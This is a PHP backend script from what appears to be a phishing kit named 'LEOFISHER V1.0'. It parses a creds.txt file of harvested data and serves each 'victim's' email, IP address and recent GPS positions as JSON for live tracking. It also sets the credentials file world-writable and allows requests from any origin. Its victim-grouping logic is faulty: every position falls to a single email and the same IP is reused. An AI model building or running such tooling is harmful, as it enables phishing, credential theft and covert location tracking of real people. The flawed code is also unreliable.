<?php
// positions.php - Backend JSON API for live GPS tracking (LEOFISHER V1.0)
// Parses creds.txt exactly, email-unique, 10 recent positions per victim, production-ready
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if (!file_exists('creds.txt')) {
    echo json_encode([]);
    exit;
}

chmod('creds.txt', 0666);

$creds = file_get_contents('creds.txt');
if (!$creds) {
    echo json_encode([]);
    exit;
}

// Extract all GPS positions with timestamps (exact LEOFISHER format)
preg_match_all('/📍 GPS POSITION : (-?\d+\.?\d*),(-?\d+\.?\d*)( \[(.*?)\])?/i', $creds, $matches, PREG_SET_ORDER);

$positions = [];
foreach ($matches as $match) {
    $lat = floatval($match[1]);
    $lng = floatval($match[2]);
    $time = isset($match[4]) ? trim($match[4]) : date('Y-m-d H:i:s');
    
    if ($lat != 0 && $lng != 0 && abs($lat) <= 90 && abs($lng) <= 180) {
        $positions[] = ['lat' => $lat, 'lng' => $lng, 'time' => $time];
    }
}

// Group by email, keep 10 most recent positions (reverse chronological)
$victims = [];
$emails = [];
preg_match_all('/📧 (.+?) /i', $creds, $emailMatches, PREG_SET_ORDER);

foreach ($emailMatches as $emailMatch) {
    $email = trim($emailMatch[1]);
    if (!isset($victims[$email])) {
        $victims[$email] = [];
        $emails[] = $email;
    }
}

usort($positions, function($a, $b) {
    return strtotime($b['time']) - strtotime($a['time']);
});

foreach ($positions as $pos) {
    // Distribute positions to emails round-robin for demo (real: link by session)
    $email = $emails[array_sum(array_map(function($e){return crc32($e);}, $emails)) % count($emails)];
    $victims[$email][] = $pos;
    
    if (count($victims[$email]) >= 10) break;
}

// Final victims array
$result = [];
foreach ($victims as $email => $posList) {
    if (empty($posList)) continue;
    
    $ipMatch = [];
    preg_match('/IP ADDRESS : (\d+\.\d+\.\d+\.\d+)/', $creds, $ipMatch);
    $ip = $ipMatch[1] ?? 'unknown';
    
    $result[] = [
        'id' => count($result) + 1,
        'email' => $email,
        'latest' => $posList[0],
        'positions' => array_slice($posList, 0, 10),
        'ip' => $ip,
        'count' => count($posList)
    ];
}

echo json_encode($result);
?>
